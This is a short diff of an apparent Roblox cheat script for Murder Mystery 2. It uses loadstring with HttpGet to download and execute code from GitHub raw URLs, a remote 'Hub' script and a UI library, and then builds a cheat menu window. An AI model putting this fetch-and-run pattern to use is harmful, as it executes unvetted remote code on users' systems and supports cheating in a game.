@@ -1,7 +1,6 @@
+getgenv().gui = false
+ 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/trdrock/mm2/main/Hub", true))()
-
-
-
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "KOSY MM2 HUB😈😈 - v6.3", HidePremium = false, IntroText = "MM2 Gui - v6.3", IntroIcon = "", SaveConfig = true, ConfigFolder = "MM2 SCRIPT"})
